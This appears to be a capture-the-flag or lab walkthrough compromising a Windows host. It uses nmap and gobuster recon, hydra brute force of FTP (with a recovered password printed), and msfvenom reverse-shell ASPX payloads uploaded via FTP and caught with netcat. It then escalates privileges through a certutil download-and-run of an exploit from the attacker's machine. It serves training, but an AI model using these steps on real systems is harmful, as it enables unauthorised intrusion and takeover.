<h1 align="center"><picture><img src = "https://github.com/user-attachments/assets/8309287c-1280-4c6c-aab7-4751ac0c2279"></picture></h1>

<h1><picture><img src="https://media2.giphy.com/media/QssGEmpkyEOhBCb7e1/giphy.gif?cid=ecf05e47a0n3gi1bfqntqmob8g9aid1oyj2wr3ds3mg700bl&rid=giphy.gif" width ="25"> </picture>Reconnaissance & Scanning</h1>

```bash
arp-scan -I eth0 --localnet --ignoredups
```
![image](https://github.com/user-attachments/assets/96c23aba-8922-4021-9daf-b626cd3c91aa)

```bash
ping -c 1 192.168.1.154
```
![image](https://github.com/user-attachments/assets/d28063e8-0e31-4da3-a932-cad363ed36ba)

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.1.180 -oG allports
```
![image](https://github.com/user-attachments/assets/7e2bca7c-88f6-4548-9b2c-7f3bb158aad3)

```bash
nmap -sCV -p21,80,135,139,445,49152,49153,49154,49155,49156,49157 192.168.1.180 -oN targeted
```
![image](https://github.com/user-attachments/assets/1e8cfde2-0bc6-40e0-b81d-bb7623cdf150)

<h1><picture><img src="https://media2.giphy.com/media/QssGEmpkyEOhBCb7e1/giphy.gif?cid=ecf05e47a0n3gi1bfqntqmob8g9aid1oyj2wr3ds3mg700bl&rid=giphy.gif" width ="25"> </picture>Vulnerability Assessment</h1>

<h2><picture><img src="https://media2.giphy.com/media/QssGEmpkyEOhBCb7e1/giphy.gif?cid=ecf05e47a0n3gi1bfqntqmob8g9aid1oyj2wr3ds3mg700bl&rid=giphy.gif" width ="25"> </picture>PORT 80</h2>

![image](https://github.com/user-attachments/assets/f5a410d8-838e-4e26-aaf3-5adee82a12f6)

``CRTL+U``
<br>
<br>
![image](https://github.com/user-attachments/assets/1ad23d93-a26a-4787-b8b8-d1a4b15e0d24)

### **Fuzzing**
```bash
gobuster dir -u http://192.168.1.180/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x txt,py,php,sh,html,js
```
![image](https://github.com/user-attachments/assets/05ea476b-4c5b-4d69-a7ce-7100fca16a53)

```bash
whatweb https://192.168.1.180
```
![image](https://github.com/user-attachments/assets/a9485353-0de8-4b79-bd39-468b80a2a6aa)

### **we didn't find anything relevant**

<h2><picture><img src="https://media2.giphy.com/media/QssGEmpkyEOhBCb7e1/giphy.gif?cid=ecf05e47a0n3gi1bfqntqmob8g9aid1oyj2wr3ds3mg700bl&rid=giphy.gif" width ="25"> </picture>PORT 445</h2>

```bash
sudo nmap --script "vuln and safe" -p445 192.168.1.180
```
![image](https://github.com/user-attachments/assets/a10cfba9-81df-4752-8595-0cfb87186bdc)

### **not vulnerable to EternalBlue**

<h2><picture><img src="https://media2.giphy.com/media/QssGEmpkyEOhBCb7e1/giphy.gif?cid=ecf05e47a0n3gi1bfqntqmob8g9aid1oyj2wr3ds3mg700bl&rid=giphy.gif" width ="25"></picture>RPC Protocol</h2>

```bash
rpcclient -U "" -N 192.168.1.180
srvinfo
querydispinfo
enumdomusers
getdompwinfo
```
![image](https://github.com/user-attachments/assets/c1825bc6-33ed-4720-8da0-ee814e5c3b52)

### **we found nothing**

<h2><picture><img src="https://media2.giphy.com/media/QssGEmpkyEOhBCb7e1/giphy.gif?cid=ecf05e47a0n3gi1bfqntqmob8g9aid1oyj2wr3ds3mg700bl&rid=giphy.gif" width ="25"> </picture>PORT 21</h2>

### **Brute Force**
```bash
hydra -L /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -P /usr/share/wordlists/seclists/Passwords/xato-net-10-million-passwords.txt ftp://192.168.1.180
```
![image](https://github.com/user-attachments/assets/f87eb6f4-5b0e-4b8e-bcba-339876bf1268)

USER:    info
<br>
PASSWD:  PolniyPizdec0211

<h1><picture><img src="https://media2.giphy.com/media/QssGEmpkyEOhBCb7e1/giphy.gif?cid=ecf05e47a0n3gi1bfqntqmob8g9aid1oyj2wr3ds3mg700bl&rid=giphy.gif" width ="25"> </picture>Gaining Access</h1>

### **FTP Connection**
```bash
ftp 192.168.1.180
```
![image](https://github.com/user-attachments/assets/deac17fa-b655-4e1a-b01d-190d7f24df61)

We already have access via port 21, but in order to gain access to the machine we must upload our malicious file to obtain a more stable connection, remember that we are dealing with a windows machine but we do not know if it is 32 or 64 bits so we will have to create two files and upload them.

Win 64bits
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.228 LPORT=443 -f aspx -o win64.aspx
```

Win 32bits
```
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.228 LPORT=443 -f aspx -o win32.aspx
```
![image](https://github.com/user-attachments/assets/e91d426c-427f-44ce-b8c1-67f685f5f5cd)
![image](https://github.com/user-attachments/assets/9836bb42-361c-42d0-be6b-95c46d9c0444)

We will now upload our malicious files via ftp service
```bash
put win64.aspx
put win32.aspx
```
![image](https://github.com/user-attachments/assets/64d2625c-224c-4c5f-95de-4206de836e34)

we put ourselves in listening mode through port 443 that we configured in our malicious code and from the web we call our files waiting for a connection.

```bash
nc -nlvp 443
```
![image](https://github.com/user-attachments/assets/efc26a9b-fd32-4ac2-b3e1-8a3da1957847)
![image](https://github.com/user-attachments/assets/d84867ea-3b47-4c19-b5b5-2bf44b92c01d)
![image](https://github.com/user-attachments/assets/b19ac984-dd3f-4fb8-b752-76716226354e)
![image](https://github.com/user-attachments/assets/23a10d09-1f99-495a-bf64-c07d0fc70a8b)

```bash
whoami
systeminfo
```
![image](https://github.com/user-attachments/assets/33f56c3d-2715-41ac-9784-16838e9dd2b6)

we are looking for possible vulnerabilities that would allow us to elevate privileges

![image](https://github.com/user-attachments/assets/0acbfa09-e55f-4641-b24a-b9f0413c8039)
![image](https://github.com/user-attachments/assets/ba2e0721-98c2-4add-bbdf-f65ad49a4f98)
![image](https://github.com/user-attachments/assets/dd5af650-cea6-4d71-863f-4aec5c2e74fc)
![image](https://github.com/user-attachments/assets/652d3252-9497-4509-a954-d7800711cac4)
![image](https://github.com/user-attachments/assets/d934c91a-9a51-4ee9-a6c2-1c85eb3c8996)
we are looking for
![image](https://github.com/user-attachments/assets/33011923-ceab-430f-bf75-435c7db9d2c6)
![image](https://github.com/user-attachments/assets/28b173c4-5065-4b69-947e-de5e760b4722)
![image](https://github.com/user-attachments/assets/96892089-a286-40dd-8aee-6747d0b77688)
![image](https://github.com/user-attachments/assets/04e15b23-b430-4aba-a767-6b59f34a5f64)
![image](https://github.com/user-attachments/assets/0e805a79-7418-4a3a-b0de-823dd9273236)

we enable a server with python to upload our file
```bash
python3 -m http.server 80
```
![image](https://github.com/user-attachments/assets/45cbc82c-bacb-4e7c-a53e-289d7fb663f5)

```bash
certutil -urlcache -f http://192.168.1.228/vuln.exe vuln.exe
```
![image](https://github.com/user-attachments/assets/4443cf1a-4841-4d11-b08e-7f38a3f492c9)

```bash
vuln.exe
```
![image](https://github.com/user-attachments/assets/0574d4d1-7502-48a4-bf4c-1ea52c8f3948)



